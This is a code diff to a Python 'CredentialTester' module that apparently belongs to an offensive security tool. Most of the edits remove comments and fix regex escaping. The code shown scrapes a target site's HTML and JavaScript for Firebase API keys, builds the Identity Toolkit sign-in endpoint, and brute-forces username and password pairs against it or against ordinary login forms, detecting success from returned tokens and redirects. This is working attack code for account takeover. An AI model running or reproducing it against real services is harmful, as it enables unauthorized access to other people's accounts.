@@ -51,7 +51,6 @@ class CredentialTester(BaseModule):
 
         print(f"\033[96m[*] Target URL: {target_url}\033[0m")
 
-        # Check if direct Firebase URL provided
         if 'identitytoolkit.googleapis.com' in target_url:
             print(f"\033[92m[+] Using Firebase Identity Toolkit URL directly\033[0m")
             endpoint = {
@@ -63,7 +62,6 @@ class CredentialTester(BaseModule):
                 }
             }
         else:
-            # Try to extract Firebase config from the page
             print(f"\033[96m[*] Attempting to extract Firebase config...\033[0m")
             firebase_url = await self._extract_firebase_endpoint(target_url)
             
@@ -78,8 +76,7 @@ class CredentialTester(BaseModule):
                     }
                 }
             else:
-                print(f"\033[93m[!] Could not extract Firebase config, trying direct brute force on provided URL\033[0m")
-                # Fallback: try brute forcing the provided URL directly with multiple formats
+                print(f"\033[93m[!] Could not extract Firebase config, trying direct brute force\033[0m")
                 endpoint = {
                     'url': target_url,
                     'form_type': 'auto',
@@ -98,23 +95,19 @@ class CredentialTester(BaseModule):
         return self.findings
 
     async def _extract_firebase_endpoint(self, url: str) -> Optional[str]:
-        """Extract Firebase API key from page and construct Identity Toolkit endpoint"""
         try:
-            # Fetch the page
             req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
             with urllib.request.urlopen(req, timeout=15) as response:
                 html = response.read().decode('utf-8', errors='ignore')
             
-            # Look for apiKey in various formats
             api_key = None
             
-            # Pattern 1: Standard Firebase config
             patterns = [
-                r'apiKey["\\'\\s]*[:=]["\\'\\s]*([A-Za-z0-9_-]{39})',
-                r'apiKey:\s*["\\']([A-Za-z0-9_-]{39})["\\']',
+                r'apiKey["\'\s]*[:=]["\'\s]*([A-Za-z0-9_-]{39})',
+                r'apiKey:\s*["\']([A-Za-z0-9_-]{39})["\']',
                 r'"apiKey":\s*"([A-Za-z0-9_-]{39})"',
-                r'apiKey\s*=\s*["\\']([A-Za-z0-9_-]{39})["\\']',
-                r'AIza[0-9A-Za-z_-]{35}',  # Direct API key pattern
+                r'apiKey\s*=\s*["\']([A-Za-z0-9_-]{39})["\']',
+                r'AIza[0-9A-Za-z_-]{35}',
             ]
             
             for pattern in patterns:
@@ -124,12 +117,11 @@ class CredentialTester(BaseModule):
                     print(f"\033[92m[+] Found API key in page source\033[0m")
                     break
             
-            # If not found in HTML, check linked JS files
             if not api_key:
-                js_files = re.findall(r'src=["\\']([^"\\']+\.js)["\\']', html)
+                js_files = re.findall(r'src=["\']([^"\']+\.js)["\']', html)
                 print(f"\033[96m[*] Scanning {len(js_files)} JS files for API key...\033[0m")
                 
-                for js_path in js_files[:10]:  # Limit to first 10 JS files
+                for js_path in js_files[:10]:
                     try:
                         js_url = js_path if js_path.startswith('http') else urllib.parse.urljoin(url, js_path)
                         js_req = urllib.request.Request(js_url, headers={'User-Agent': 'Mozilla/5.0'})
@@ -149,7 +141,6 @@ class CredentialTester(BaseModule):
                         continue
             
             if api_key:
-                # Construct Firebase Identity Toolkit endpoint
                 firebase_url = f"https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key={api_key}"
                 return firebase_url
             
@@ -260,7 +251,6 @@ class CredentialTester(BaseModule):
                     loop = asyncio.get_event_loop()
 
                     def do_request():
-                        # If Firebase endpoint, use Firebase format
                         if form_type == 'firebase' or 'identitytoolkit' in url:
                             body = json.dumps({
                                 'email': username,
@@ -284,9 +274,7 @@ class CredentialTester(BaseModule):
                             except Exception as e:
                                 return 0, str(e), {}, 'firebase'
                         
-                        # Otherwise try multiple formats
                         else:
-                            # Try JSON email format
                             try:
                                 body = json.dumps({
                                     'email': username,
@@ -306,7 +294,6 @@ class CredentialTester(BaseModule):
                             except Exception:
                                 pass
 
-                            # Try JSON username format
                             try:
                                 body = json.dumps({
                                     'username': username,
@@ -326,7 +313,6 @@ class CredentialTester(BaseModule):
                             except Exception:
                                 pass
 
-                            # Try form email format
                             try:
                                 data = urllib.parse.urlencode({
                                     'email': username,
@@ -346,7 +332,6 @@ class CredentialTester(BaseModule):
                             except Exception:
                                 pass
 
-                            # Try form username format
                             try:
                                 data = urllib.parse.urlencode({
                                     'username': username,
@@ -372,7 +357,6 @@ class CredentialTester(BaseModule):
                     self._print_progress(counter[0], total_attempts,
                                          prefix=f'  \033[96m{username[:22]:<22}\033[0m')
 
-                    # Show first response for debugging
                     if counter[0] == 1:
                         sys.stdout.write('\n')
                         print(f"\033[90m[debug] HTTP {status} | Format: {used_format} | {text[:300]}\033[0m\n")
@@ -382,24 +366,19 @@ class CredentialTester(BaseModule):
                         found_event.set()
                         return
 
-                    # Success detection
                     is_success = False
 
-                    # Firebase success: returns idToken
                     if used_format == 'firebase':
                         if 'idtoken' in tl or 'id_token' in tl:
                             if not any(err in tl for err in ['invalid', 'error', 'failed']):
                                 is_success = True
-                        # Also check for registered field which indicates valid credentials
                         elif 'registered' in tl and 'true' in tl:
                             is_success = True
                     
-                    # Generic success detection
                     elif any(k in tl for k in ['token', 'access_token', 'session', 'success']):
                         if not any(err in tl for err in ['invalid', 'error', 'failed', 'wrong', 'denied']):
                             is_success = True
                     
-                    # Check for redirects
                     if status in [301, 302, 303]:
                         location = resp_headers.get('Location', '').lower()
                         if location and not any(p in location for p in ['login', 'error', 'fail']):
